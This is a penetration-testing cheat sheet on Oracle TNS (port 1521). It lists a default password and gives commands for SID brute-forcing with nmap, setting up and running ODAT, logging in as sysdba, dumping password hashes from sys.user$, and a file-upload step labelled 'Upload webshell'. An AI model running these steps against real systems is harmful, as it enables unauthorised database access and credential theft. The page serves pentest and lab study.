+++
title = "Oracle TNS"
+++

- `TCP 1521`: normal
- Server Config:
    - `$ORACLE_HOME/network/admin/tnsnames.ora`: names to addrs
    - `$ORACLE_HOME/network/admin/listener.ora`: listener behavior
    - `$ORACLE_HOME/sqldeveloper`: DB protection blacklist
    - Default Password: `DBSNMP/dbsnmp`
- https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

Oracle's version of SQL.

```bash
# SID Brute-forcing via nmap
sudo nmap -p1521 -sV --script oracle-sid-brute <TARGET>

### ODAT
# TNS Setup for Enumeration
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install --break-system-packages python-libnmap
git submodule init
git submodule update
pip3 install --break-system-packages cx_Oracle
sudo apt install -y python3-scapy
sudo pip3 install --root-user-action colorlog termcolor passlib python-libnmap
sudo apt install -y build-essential libgmp-dev
pip3 install --break-system-packages pycryptodome

# Enumeration
odat.py all -d <SID> -s <TARGET>

### Connect
# Install: https://askubuntu.com/a/207145
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba
# https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared
# If you come across the following error sqlplus:
# error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, 
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf" ; sudo ldconfig

# SQL Commands
select table_name from all_tables ;
select * from user_role_privs ;
select name, password from sys.user$ ;

### Upload webshell (if webserver)
# Linux	/var/www/html
# Windows	C:\inetpub\wwwroot
echo "Oracle File Upload Test" > testing.txt
odat.py utlfile -d <SID> -U <USER> -P <PASSWORD> -s <TARGET> --sysdba --putFile <UPLOAD_DIR> testing.txt ./testing
curl -Lo- http://<TARGET>/testing.txt
```
